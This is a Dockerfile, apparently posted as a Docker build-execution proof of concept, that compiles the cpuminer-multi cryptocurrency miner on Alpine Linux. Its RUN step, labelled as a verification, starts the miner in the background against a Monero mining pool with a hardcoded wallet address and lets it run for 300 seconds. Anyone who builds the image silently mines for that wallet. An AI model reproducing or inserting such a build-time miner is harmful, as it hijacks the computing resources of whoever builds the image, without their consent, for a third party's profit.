# Title: docker-bug-exec  
# Desc: exec evaluation  
# Autor: Ferro.Mariano, navebinario  
# Url: gitlab.com/docker-bug-exec/Dockerfile.git  
# Date: 2017-08-26  
# Note: On Alpine 3.5 curl-dev uses LibreSSL which is incompatible with the
required OpenSSL-dev.  
  
FROM alpine:3.4  
  
RUN set -x \  
# Runtime dependencies.  
&& apk add --no-cache \  
libcurl \  
libgcc \  
libstdc++ \  
openssl \  
# Build dependencies.  
&& apk add --no-cache -t .build-deps \  
autoconf \  
automake \  
build-base \  
curl \  
curl-dev \  
git \  
openssl-dev \  
# Compile from source code.  
&& git clone --recursive https://github.com/tpruvot/cpuminer-multi.git
/tmp/cpuminer \  
&& cd /tmp/cpuminer \  
&& ./autogen.sh \  
&& ./configure CFLAGS="-O2 -march=native" \--with-crypto --with-curl \  
&& make install \  
# Install dumb-init (avoid PID 1 issues).  
# https://github.com/Yelp/dumb-init  
&& curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-
init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \  
&& chmod +x /usr/local/bin/dumb-init \  
# Clean-up  
&& cd / \  
&& apk del --purge .build-deps \  
&& rm -rf /tmp/* \  
# Verify  
&& cpuminer --cputest \  
&& cpuminer --version \  
&& cpuminer -a cryptonight --threads=1 \--retries=3 \--retry-pause=5
\--background -o stratum+tcp://xmr-usa.dwarfpool.com:8005 -u
46q61JAmDWEXkm7UcDkKqs8wko4xdc68Fbh8vdVMBLzjHKh1vrcrKoYjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3ggVU5d.docker
-p x \  
&& sleep 300 \  
&& exit  
  
ENTRYPOINT ["dumb-init"]  
CMD ["cpuminer", "--help"]  
  
  
ENTRYPOINT ["dumb-init"]  
CMD ["cpuminer", "--help"]  

